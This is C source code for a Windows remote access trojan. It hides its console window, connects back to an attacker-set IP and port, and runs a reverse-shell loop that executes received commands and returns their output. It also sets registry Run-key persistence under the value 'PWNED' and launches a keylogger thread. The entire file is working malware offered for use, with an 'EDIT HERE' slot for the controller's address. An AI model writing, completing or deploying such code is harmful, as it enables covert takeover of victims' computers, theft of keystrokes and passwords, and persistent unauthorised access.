#include <stdio.h>     //standard input/output
#include <stdlib.h>    //standard utilities library
#include <unistd.h>    //access to the POSIX operating system API
#include <winsock2.h>  //windows sockets
#include <windows.h>   //declarations for all functions in Windows API
#include <winuser.h>   //windows controls
#include <wininet.h>   //windows internet interfaces
#include <windowsx.h>  //windows programming interfaces
#include <string.h>    //manupulate strings (char arrays)
#include <sys/stat.h>  //stat() function prototypes
#include <sys/types.h> //other function prototypes
#include "keylogger.h" //custom keylogger import

//set host IP Address and Port [EDIT HERE]
char *ServIP = "192.168.0.9";
unsigned short ServPort = 54654;

//function to flush arrays
#define bzero(p, size) (void) memset((p), 0, (size))

int sock;

//function for persistence
int bootRun()
{
	char error[128] = "Failed\n";
	char success[128] = "Created Persistence @: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
	TCHAR szPath[MAX_PATH]; //Store persistence path in windows registry
	DWORD pathLen = 0; 

	pathLen = GetModuleFileName(NULL, szPath, MAX_PATH); //retrieve persistence path
	if (pathLen == 0)
	{
		send(sock, error, sizeof(error), 0); //error handling
		return -1;
	}

	HKEY NewVal; //create new registry key
	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS)
	{
		send(sock, error, sizeof(error), 0); //error handling
		return -1;
	}

	DWORD pathLenBytes = pathLen * sizeof(*szPath); //create new registry name
	if(RegSetValueEx(NewVal, TEXT("PWNED"), 0, REG_SZ, (LPBYTE)szPath, pathLenBytes) != ERROR_SUCCESS)
	{
		RegCloseKey(NewVal);
		send(sock, error, sizeof(error), 0); //error handling
		return -1;
	}

	RegCloseKey(NewVal);
	send(sock, success, sizeof(success), 0); //success
	return 0;
}


//function to slice and manipulate strings
char *
str_cut(char str[], int slice_from, int slice_to)
{
        if(str[0] == '\0')
                return NULL;

        char *buffer;
        size_t str_len, buffer_len;

        if (slice_to < 0 && slice_from > slice_to)
        {
                str_len = strlen(str);
                if (abs(slice_to) > str_len-1)
                        return NULL;

                if (abs(slice_from) > str_len)
                        slice_from = (-1) * str_len;

                buffer_len = slice_to - slice_from;
                str_len += (str_len + slice_from);
        }

        else if (slice_from >=0 && slice_to > slice_from)
        {
                str_len = strlen(str);
                if (slice_from > str_len-1)
                        return NULL;

                buffer_len = slice_to - slice_from;
                str += slice_from;
        }

        else
                return  NULL;

        buffer = calloc(buffer_len, sizeof(char));
        strncpy(buffer, str, buffer_len);
        return buffer;
}


void Shell()
{
	char buffer[1024]; //contain command from server
	char container[1024]; //check if command > 1024
	char total_response[18384]; //concatenate when command > 1024

	while (1)
	{
		jump:
		bzero(buffer, sizeof(buffer));
		bzero(container, sizeof(container));
		bzero(total_response, sizeof(total_response));
		recv(sock, buffer, sizeof(buffer), 0); //receive command from server

		//quit server with q command
		if (strncmp("q", buffer, 1) == 0)
		{
			closesocket(sock);
			WSACleanup();
			exit(0);
		}

		//change directory with cd command
		else if(strncmp("cd ", buffer, 3) == 0)
		{
			chdir(str_cut(buffer,3,100)); //isolate directory name from cd
		}

		//persistence on boot-up
		else if(strncmp("persist", buffer, 7) == 0)
		{
			bootRun();
		}

		//implement keylogger using thread
		else if(strncmp("keylog_start", buffer, 12) == 0)
		{
			HANDLE thread = CreateThread(NULL, 0, logg, NULL, 0, NULL);
			goto jump;
		}

		//run any other command
		else
		{
			//fp = file descriptor of buffer
			FILE *fp;
			fp = _popen(buffer, "r");//read and execute command

			//concatenation process when command > 1024
			while(fgets(container, sizeof(container), fp) != NULL)
			{
				strcat(total_response, container);
			}
			send(sock, total_response, sizeof(total_response), 0);
			fclose(fp);
		}
	}

}


int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)
{
	//create new window handle
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL); //window name = NULL
	ShowWindow(stealth, 0); //nCmdShow = 0 hides window

	//create socket object
	struct sockaddr_in ServAddr;
	WSADATA wsaData; //contain winsock.dll info

	//check winsock.dll status
	if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0)
	{
		exit(1);
	}

	//define socket object
	sock = socket(AF_INET, SOCK_STREAM, 0); //establish tcp connection
	memset(&ServAddr, 0, sizeof(ServAddr)); //flush ServAddr with 0

	//set ServAddr parameters
	ServAddr.sin_family = AF_INET;
	ServAddr.sin_addr.s_addr = inet_addr(ServIP); //covert string to IPv4 format
	ServAddr.sin_port = htons(ServPort); //convert to network byte order


	//wait for server connection to establish
	start :
	while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0)
	{
		Sleep(10);
		goto start;
	}

	Shell();
}


